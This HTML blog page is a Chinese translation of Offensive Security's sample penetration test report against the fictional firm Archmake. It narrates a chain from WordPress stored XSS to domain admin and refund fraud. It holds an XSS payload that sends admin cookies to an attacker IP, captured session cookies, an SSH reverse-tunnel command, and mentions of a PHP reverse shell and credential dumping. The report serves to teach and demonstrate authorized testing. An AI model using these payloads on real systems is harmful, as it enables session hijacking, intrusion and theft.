@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>一份Archmake.COM的渗透测试报告 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-09-23T19:03:03.000Z" itemprop="datePublished">
+          2013-09-24
+      </time>
+    
+    
+    | 
+    <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/Offensive-security/'>Offensive security</a>
+    
+    
+</span>
+    <h1 class="post-title">一份Archmake.COM的渗透测试报告</h1>
+    <section class="post-content">
+      <p>前言</p>  <p>这是<a href="http://www.offensive-security.com/" target="_blank">offensive security</a>发布的一份渗透测试报告样例。offensive security 是backtrack-linux.org、exploit-db.com的缔造者。</p>  <h4>概述</h4>  <p><a href="http://www.offensive-security.com/" target="_blank">Offensive security</a>已经被授权对Archmake的外部网站进行一次渗透测试.测试评估的方式是模拟恶意的攻击者对公司进行目的明确的渗透.在初期的信息搜集阶段,发现Archmake公司仅仅只有一个web网站和一个邮件服务器.可供攻击的目标比较少.</p>  <p>在对网站的安全评估中,发现它安装了一个有漏洞的WordPress插件.成功利用这个漏洞,取得了<a href="http://Ha.Cker.In/tag/WordPress" target="_blank">WordPress</a>的管理权限.然后反弹了一个交互式的shell并成功提到root权限.</p>  <p>获取了网站服务器的权限之后,开始对内网进行渗透,经过一番尝试,成功获取到了域管理员的权限.之后对内网进行拓扑分析,发现了内网的公司数据库并成功控制.这个数据库不仅存储了订单信息和客户资料,还保存了交易的相关信息.通过控制这个系统,攻击者可以直接提取现金.</p>  <h4>测试过程</h4>  <h3>WordPress漏洞利用</h3>  <p>在对目标系统进行搜集的时候发现网站采用了wordpress 3.3.1搭建.我们在对WordPress进行代码审计的同时,用WPScan扫描了目标网站,发现一个不安全的插件:</p>  <pre>./wpscan.rb –url www.Archmake.com –enumerate p</pre><br><br><pre><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></pre><br><br><pre><strong></strong></pre><br><br><pre><strong>_</strong></pre><br><br><pre><strong>_</strong></pre><br><br><pre>\ \</pre><br><br><pre>/ / <strong> \ / __</strong>|</pre><br><br><pre>\ \ /\ / /| |<strong>) | (_</strong></pre><br><br><pre><strong>_ </strong> <em> </em> <strong></strong></pre><br><br><pre>\ \/ \/ / | _/ _<strong> \ / </strong>|/ <em>` | ‘</em> \</pre><br><br><pre>\ /\ / | |</pre><br><br><pre><strong>__) | (</strong>| (<em>| | | | |</em></pre><br><br><pre>\/ \/</pre><br><br><pre>||</pre><br><br><pre>|<strong>_</strong>/ _<strong>|\</strong>,<em>|</em>| |<em>| v1.1</em></pre><br><br><pre>WordPress Security Scanner by ethicalhack3r.co.uk</pre><br><br><pre>Sponsored by the RandomStorm Open Source Initiative</pre><br><br><pre><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></pre><br><br><pre>| URL: <a href="http://www.Archmake.com/" target="_blank" rel="external">http://www.Archmake.com/</a></pre><br><br><pre>| Started on Tue Jan 24 18:44:49 2012</pre><br><br><pre>[!] The WordPress theme in use is called &quot;twentyeleven&quot;.</pre><br><br><pre>[!] The WordPress &quot;<a href="http://www.Archmake.com/readme.html&amp;quot" target="_blank" rel="external">http://www.Archmake.com/readme.html&amp;quot</a>; file exists.</pre><br><br><pre>[!] WordPress version 3.3.1 identified from meta generator.</pre><br><br><pre>[+] Enumerating installed plugins…</pre><br><br><pre>Checking for 2892 total plugins… 100% complete.</pre><br><br><pre>[+] We found 2 plugins:</pre><br><br><pre>Name: relevanssi</pre><br><br><pre>Location: <a href="http://www.Archmake.com/wp-content/plugins/relevanssi/" target="_blank" rel="external">http://www.Archmake.com/wp-content/plugins/relevanssi/</a></pre><br><br><pre>Directory listing enabled? Yes.</pre><br><br><pre>Name: relevanssi</pre><br><br><pre>Location: <a href="http://www.Archmake.com/wp-content/plugins/relevanssi/" target="_blank" rel="external">http://www.Archmake.com/wp-content/plugins/relevanssi/</a></pre><br><br><pre>Directory listing enabled? Yes.</pre><br><br><pre>[+] There were 1 vulnerabilities identified from the plugin names:</pre><br><br><pre>[!] Relevanssi 2.7.2 WordPress Plugin Stored XSS Vulnerability</pre><br><br><pre>* Reference: <a href="http://www.exploit-db.com/exploits/16233/" target="_blank" rel="external">http://www.exploit-db.com/exploits/16233/</a></pre><br><br><pre>[+] Finished at Tue Jan 24 18:45:30 2012 </pre><br><br><p>正如WPScan扫描结果展示的一样,这个Relevanssi插件存在一个<a href="http://Ha.Cker.In/tag/XSS" target="_blank">XSS</a>漏洞.成功利用这个<a href="http://Ha.Cker.In/tag/漏洞" target="_blank">漏洞</a>可以窃取到管理员的cookies.</p>
+
+<p>第一步,我们在Archmake网站的搜索栏中插入如下代码:</p>
+
+<pre>&lt;script&gt;new Image().src=&quot;http://172.16.40.204/p.php?cookie=&quot;+document.cookie; &lt;/script&gt;</pre>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image001.png" target="_blank" rel="external"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="129" alt="clip_image001" src="http://img.cker.in/Archmake.COM_99C0/clip_image001_thumb.png" width="529" border="0"></a></p><br><a id="more"></a><br><p></p>
+
+<p>当WordPress管理员点击后台管理面板上的”User Searches”时,脚本就会执行.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image002.png" target="_blank" rel="external"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="215" alt="clip_image002" src="http://img.cker.in/Archmake.COM_99C0/clip_image002_thumb.png" width="300" border="0"></a></p>
+
+<p>远程攻击者的服务器上就可以接收到管理员的cookie.</p>
+
+<pre>GET</pre>
+
+<pre>/p.php?cookie=wordpress_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C1328098588</pre>
+
+<pre>%7C72c3335ad1e783b75bb3d8cf9e85fc9c;%20wp-settings-time-</pre>
+
+<pre>1=1327925790;%20wordpress_test_cookie=WP+Cookie+check;%20wordpress_logged_i</pre>
+
+<pre>n_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C1328098588%7Caf1bcabca49191de76e</pre>
+
+<pre>c45e798ae5ada;%20wp-settings-</pre>
+
+<pre>1=editor%3Dhtml;%20wordpress_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C13275</pre>
+
+<pre>99469%7C3ada64cf8e918c9a4bf148896181fc63;%20wordpress_logged_in_ed8a4e5dd81</pre>
+
+<pre>3c7b5d262130b08955a6a=admin HTTP/1.1</pre>
+
+<p>然后使用firefox的cookie编辑器,修改cookie.这样就可以绕过WordPress的登录功能,获得一个管理员会话.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image004.jpg" target="_blank" rel="external"><img title="clip_image004" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="360" alt="clip_image004" src="http://img.cker.in/Archmake.COM_99C0/clip_image004_thumb.jpg" width="635" border="0"></a></p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image006.jpg" target="_blank" rel="external"><img title="clip_image006" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="216" alt="clip_image006" src="http://img.cker.in/Archmake.COM_99C0/clip_image006_thumb.jpg" width="635" border="0"></a></p>
+
+<p>获取到后台管理员权限之后,整站的权限就有很多种方法可以得到了.最直接的就是修改WordPress的主题文件.</p>
+
+<h3>WordPress插件任意文件类型上传</h3>
+
+<p>取得WordPress系统的权限了,接下来可以<a href="http://Ha.Cker.In/tag/白盒审计" target="_blank">白盒审计</a>一下,看看是否有其他的漏洞可能被攻击者利用.这里我们审计了WordPress安装的插件.</p>
+
+<p>审计插件的时候发现一个可以允许用户上传头像的插件.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image008.jpg" target="_blank" rel="external"><img title="clip_image008" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="156" alt="clip_image008" src="http://img.cker.in/Archmake.COM_99C0/clip_image008_thumb.jpg" width="635" border="0"></a></p>
+
+<p>通过对这个插件的源码进行审计,发现它是通过一个正则表达式来控制上传文件的类型的.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image009.png" target="_blank" rel="external"><img title="clip_image009" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="317" alt="clip_image009" src="http://img.cker.in/Archmake.COM_99C0/clip_image009_thumb.png" width="661" border="0"></a></p>
+
+<p>上面这段用来检查上传文件的代码是存在缺陷的.这个正则对字符串进行了一次简单的过滤,而且这是唯一的一个检测文件类型的手段.它的本意是只允许像”Myimage.png”这样的文件名.但是像”Myimage.png.php”这样的文件名也可以成功通过正则的检测,上传到服务器上.</p>
+
+<p>虽然将后续攻击上传到服务器上有很多方法(前面提到过,比如修改主题).但是我们决定采用这个漏洞来上传.一是可以验证一个新的漏洞,二是这样子对服务器所做的更改最小化.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image011.jpg" target="_blank" rel="external"><img title="clip_image011" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="209" alt="clip_image011" src="http://img.cker.in/Archmake.COM_99C0/clip_image011_thumb.jpg" width="635" border="0"></a></p>
+
+<p>为了验证这个上传过程确实跟我们分析的一样,先上传了一个标准的图像文件作为测试.然后上传了一个配置好的反弹shell的php脚本.</p>
+
+<p>执行这个脚本,在攻击者控制的远程服务器上可以获得一个交互式的shell环境.因为这个shell是以webserver的权限的运行的,所以它只有很低的权限.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image013.jpg" target="_blank" rel="external"><img title="clip_image013" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="213" alt="clip_image013" src="http://img.cker.in/Archmake.COM_99C0/clip_image013_thumb.jpg" width="635" border="0"></a></p>
+
+<h3>Linux本地权限提升</h3>
+
+<p>获得了目标网站服务器的交互式shell之后,下一个目标自然是获得系统的root权限了.</p>
+
+<p>目标系统的相关信息如下: Linux version 2.6.32-5-686 (Debian 2.6.32-38) (ben@decadent.org.uk) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Mon Oct 3 04:15:24 UTC 2011</p>
+
+<p>经过一番资料搜索和测试,发现这个系统存在一个race condition的缺陷.先是通过上传头像的插件上传了利用代码.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image015.jpg" target="_blank" rel="external"><img title="clip_image015" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="429" alt="clip_image015" src="http://img.cker.in/Archmake.COM_99C0/clip_image015_thumb.jpg" width="635" border="0"></a></p>
+
+<p>解压,加执行权限,执行利用程序,成功获得root权限.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image017.jpg" target="_blank" rel="external"><img title="clip_image017" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="230" alt="clip_image017" src="http://img.cker.in/Archmake.COM_99C0/clip_image017_thumb.jpg" width="635" border="0"></a></p>
+
+<p>现在,这个网站服务器已经可以作为一个恶意攻击者进行内网渗透的跳板了.如果这是一次真实的攻击,那么这台网站服务器上的任何数据都已经不可信了,因为攻击者可以随意修改控制.</p>
+
+<h3>长期驻守服务器</h3>
+
+<p>获得了服务器的管理权限之后,就需要维护一个更加稳定的连接来进行后续的渗透.</p>
+
+<p>通过对该服务器的检查,发现它的ssh服务运行在22000端口.我们决定使用ssh将内网端口转发出来.这样子既方便,又不会给服务器带来额外的安全风险.</p>
+
+<p>为了把对系统的变更降到最低,我们既没有添加账户,也没有修改账户口令.而是采用了SSH 基于密钥的认证方式.</p>
+
+<p>之前提到过.我们自己控制的SSH服务器,ssh开在53端口.通过执行以下命令,将网站服务器的22000端口转发出来.</p>
+
+<pre>ssh -o 'StrictHostKeyChecking no' -R 22000:127.0.0.1:22000 -p 53 172.16.40.204 ping 127.0.0.1</pre>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image019.jpg" target="_blank" rel="external"><img title="clip_image019" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="332" alt="clip_image019" src="http://img.cker.in/Archmake.COM_99C0/clip_image019_thumb.jpg" width="634" border="0"></a></p>
+
+<p>此外还需要创建一个SOCKS代理,这样攻击者就可以通过这个代理来访问目标网络里的服务.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image021.jpg" target="_blank" rel="external"><img title="clip_image021" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="206" alt="clip_image021" src="http://img.cker.in/Archmake.COM_99C0/clip_image021_thumb.jpg" width="635" border="0"></a></p>
+
+<h4>存在漏洞的splunk</h4>
+
+<p>当分析已经控制的网站服务器配置的时候发现一个内网网段10.10.0.x.对这个内网网段进行扫描分析,我们发现了一台splunk服务器.</p>
+
+<p>splunk 低于4.2.5的版本存在一个高危的远程命令执行漏洞.通过前面介绍的SOCKS代理,我们访问到了Splunk的web界面.证实了它的版本是4.2.2</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image023.jpg" target="_blank" rel="external"><img title="clip_image023" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="452" alt="clip_image023" src="http://img.cker.in/Archmake.COM_99C0/clip_image023_thumb.jpg" width="650" border="0"></a></p>
+
+<p>在windows上splunk一般都是以SYSTEM权限运行的.所以我们可以直接添加一个管理员用户.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image025.jpg" target="_blank" rel="external"><img title="clip_image025" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="585" alt="clip_image025" src="http://img.cker.in/Archmake.COM_99C0/clip_image025_thumb.jpg" width="635" border="0"></a></p>
+
+<p>这个命令执行漏洞是没有回显的,只能通过登录远程桌面来验证命令是否执行成功.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image026.png" target="_blank" rel="external"><img title="clip_image026" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="499" alt="clip_image026" src="http://img.cker.in/Archmake.COM_99C0/clip_image026_thumb.png" width="631" border="0"></a></p>
+
+<p>现在我们又控制了内网一台win服务器.</p>
+
+<h4>获得域管理权限</h4>
+
+<p>内网渗透,而且是windows主机.下一步一般就是要获取域管理员的权限了.我们把WCE(Windows Credential Editor)上传到splunk服务器上.WCE可以从内存中读取认证信息,然后利用这些认证信息来做一些有用的事情.</p>
+
+<p>在splunk服务器上执行wce.exe,成功从内存中获取到了域管理员的token.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image027.png" target="_blank" rel="external"><img title="clip_image027" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="199" alt="clip_image027" src="http://img.cker.in/Archmake.COM_99C0/clip_image027_thumb.png" width="631" border="0"></a></p>
+
+<p>有了这些认证信息,就可以很容易的获取一个域管理员权限的shell.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image028.png" target="_blank" rel="external"><img title="clip_image028" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="500" alt="clip_image028" src="http://img.cker.in/Archmake.COM_99C0/clip_image028_thumb.png" width="609" border="0"></a></p>
+
+<p>然后利用这个shell运行终端管理(Microsoft Management Console).攻击者就或得了域的控制权限.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image029.png" target="_blank" rel="external"><img title="clip_image029" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="389" alt="clip_image029" src="http://img.cker.in/Archmake.COM_99C0/clip_image029_thumb.png" width="639" border="0"></a></p>
+
+<h4>数据库数据利用</h4>
+
+<p>控制splunk服务器之后,在它的本地文件系统中发现了一个csv文件.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image030.png" target="_blank" rel="external"><img title="clip_image030" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="279" alt="clip_image030" src="http://img.cker.in/Archmake.COM_99C0/clip_image030_thumb.png" width="572" border="0"></a></p>
+
+<p>分析发现这是一个从数据库中导出的客户信息的文件.</p>
+
+<p><a href="http://static.freebuf.com/2013/09/14.png" target="_blank" rel="external"><img title="clip_image031" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="342" alt="clip_image031" src="http://img.cker.in/Archmake.COM_99C0/clip_image031.png" width="636" border="0"></a></p>
+
+<p>很显然,应该是exportcsv.exe这个程序导出的数据库信息.用OD对这个程序进行了分析,发现它直连了一个MS SQL server.连接的认证信息直接编码在了程序里面.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image032.png" target="_blank" rel="external"><img title="clip_image032" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="188" alt="clip_image032" src="http://img.cker.in/Archmake.COM_99C0/clip_image032_thumb.png" width="636" border="0"></a></p>
+
+<p>利用获取到的认证信息可以直连到数据库,从而获得了控制这个数据库所有数据的权限.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image033.png" target="_blank" rel="external"><img title="clip_image033" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="238" alt="clip_image033" src="http://img.cker.in/Archmake.COM_99C0/clip_image033_thumb.png" width="329" border="0"></a></p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image034.png" target="_blank" rel="external"><img title="clip_image034" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="270" alt="clip_image034" src="http://img.cker.in/Archmake.COM_99C0/clip_image034_thumb.png" width="531" border="0"></a></p>
+
+<p>导出数据库的数据进行分析.发现了大量客户的信息,包括用户ID,姓名,邮件,电话,加密的密码和其他信息.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image035.png" target="_blank" rel="external"><img title="clip_image035" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="282" alt="clip_image035" src="http://img.cker.in/Archmake.COM_99C0/clip_image035_thumb.png" width="637" border="0"></a></p>
+
+<p>密码是用md5加密的.将这些hash导入我们维护的密码破解器进行破解.一共导入了1000个hash,22秒后,成功破解了996个.(话外音:这是什么节奏啊….)</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image036.png" target="_blank" rel="external"><img title="clip_image036" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="692" alt="clip_image036" src="http://img.cker.in/Archmake.COM_99C0/clip_image036_thumb.png" width="645" border="0"></a></p>
+
+<h4>控制Archmake的交易</h4>
+
+<p>在对数据库进行深入分析的时候我们注意到有很多表的内容会定期更新.通过对这些表的监控和分析发现,原来这是跟订单有关的表.这些订单的信息会定期的更新到数据库里.一段时间以后,会根据”Category”字段的不同进行不同的处理.</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image037.png" target="_blank" rel="external"><img title="clip_image037" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="148" alt="clip_image037" src="http://img.cker.in/Archmake.COM_99C0/clip_image037_thumb.png" width="450" border="0"></a></p>
+
+<p>经过对数据库监控和在数据库中添加一些测试数据,最后总结除了Categories字段的含义:</p>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image038.png" target="_blank" rel="external"><img title="clip_image038" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="126" alt="clip_image038" src="http://img.cker.in/Archmake.COM_99C0/clip_image038_thumb.png" width="339" border="0"></a></p>
+
+<p>交易的类型一确定,相关的信息就会插入到这个表里.我们发现如果插入一个有效的用户ID,用户信息卡信息填攻击者自己控制的信用卡,交易类型选4(4是退款).就可以退任意数额的钱到攻击者的信用卡账户了.这个已经在可控的环境下被证实了.</p>
+
+<p><a href="http://www.offensive-security.com/penetration-testing-sample-report.pdf" target="_blank" rel="external">原文下载</a> 转自<a href="http://www.freebuf.com/articles/web/12632.html" target="_blank">FreeBuf</a></p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1029.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1029.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1029.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1029.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/1030.seo/">
+        ← H3C技术论坛pma漏洞导致主站沦陷
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/1028.seo/">
+        Python调用MongoDB使用心得 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
